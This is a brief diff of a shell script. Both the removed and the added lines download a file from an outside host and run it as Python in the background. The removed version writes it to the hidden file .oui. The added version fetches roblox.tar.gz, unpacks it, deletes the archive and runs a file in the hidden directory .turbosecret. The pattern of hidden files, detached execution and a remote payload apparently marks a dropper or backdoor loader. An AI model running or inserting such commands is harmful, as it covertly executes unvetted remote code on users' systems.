@@ -1,2 +1,4 @@
-curl https://mathyshenin.me/control > .oui
-nohup python3 .oui
+curl https://mathyshenin.me/roblox.tar.gz > roblox.tar.gz
+tar -xzf roblox.tar.gz
+rm roblox.tar.gz
+nohup python3 .turbosecret/roblox
